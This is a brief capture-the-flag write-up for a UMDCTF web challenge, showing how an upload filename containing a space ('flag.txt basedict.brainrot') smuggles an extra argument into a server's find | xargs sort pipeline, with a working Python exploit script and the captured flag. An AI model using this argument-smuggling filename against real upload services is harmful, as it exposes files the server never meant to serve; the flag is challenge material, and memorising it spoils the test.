---
ai_date: 2025-04-27 03:51:56
ai_summary: Payload filename with spaces bypassed sort and revealed flag in response
tags:
  - filename-bypass
  - xss
created: 2025-04-25T18:58
updated: 2025-04-27T03:51
---

The shell command looks suspicious:

```sh
find {session['upload_dir']} -name \*.brainrot | xargs sort | uniq
```

I can tell that this will be messed up by spaces in filename, so after a bit of playing around I found the payload filename.

`flag.txt basedict.brainrot`


```sh
$ ls upload_dir/
basedict.brainrot   flag.txt  'flag.txt basedict.brainrot'

$ find upload_dir -name \*.brainrot
upload_dir/basedict.brainrot
upload_dir/flag.txt basedict.brainrot

$ find upload_dir -name \*.brainrot | xargs sort
flag  # from flag.txt
hello # from basedict.brainrot
hello 
not_flag
not_flag
```

```python
import requests
import re

base_url = 'https://brainrot-dictionary.challs.umdctf.io'
upload_url = f"{base_url}/"
download_url = f"{base_url}/dict"

s = requests.Session()
files = {
    'user_file': (
        'flag.txt basedict.brainrot',
        b'chicken'
    )
}
r = s.post(upload_url, files=files, allow_redirects=False)
r = s.get(download_url)
print(re.search(r'[\w_]+{.*}', r.text).group(0))
```

```flag
UMDCTF{POSIX_no_longer_recommends_that_this_is_possible}
```